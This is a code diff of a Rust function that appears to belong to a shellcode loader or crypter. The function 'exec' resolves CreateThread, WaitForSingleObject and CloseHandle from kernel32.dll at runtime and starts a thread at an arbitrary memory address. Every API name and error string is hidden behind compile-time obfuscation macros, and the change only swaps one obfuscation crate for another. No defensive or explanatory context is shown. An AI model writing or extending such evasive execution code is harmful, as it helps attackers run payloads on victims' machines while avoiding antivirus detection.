@@ -1,11 +1,11 @@
 pub unsafe fn exec(p: usize) -> Result<(), String> {
     use std::ffi::c_void;
     use crate::utils::{load_library, get_proc_address};
-    use rustcrypt_ct_macros::{obf_lit_bytes, obf_lit};
+    use obfstr::{obfbytes, obfstr};
     use std::ptr::null_mut;
     use std::mem::transmute;
-    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
-    let p_create_thread = get_proc_address(kernel32, obf_lit_bytes!(b"CreateThread\0").as_slice())?;
+    let kernel32 = load_library(obfbytes!(b"kernel32.dll\0").as_slice())?;
+    let p_create_thread = get_proc_address(kernel32, obfbytes!(b"CreateThread\0").as_slice())?;
     type CreateThreadFn = unsafe extern "system" fn(
         lp_thread_attributes: *mut c_void,
         dw_stack_size: usize,
@@ -26,13 +26,13 @@ pub unsafe fn exec(p: usize) -> Result<(), String> {
         null_mut(),
     );
     if h.is_null() {
-        return Err(obf_lit!("CreateThread failed").to_string());
+        return Err(obfstr!("CreateThread failed").to_string());
     }
-    let p_wait = get_proc_address(kernel32, obf_lit_bytes!(b"WaitForSingleObject\0").as_slice())?;
+    let p_wait = get_proc_address(kernel32, obfbytes!(b"WaitForSingleObject\0").as_slice())?;
     type WaitForSingleObjectFn = unsafe extern "system" fn(*mut c_void, u32) -> u32;
     let wait_for_single_object: WaitForSingleObjectFn = transmute(p_wait);
     wait_for_single_object(h, INFINITE);
-    let p_close = get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice())?;
+    let p_close = get_proc_address(kernel32, obfbytes!(b"CloseHandle\0").as_slice())?;
     type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
     let close_handle: CloseHandleFn = transmute(p_close);
     close_handle(h);
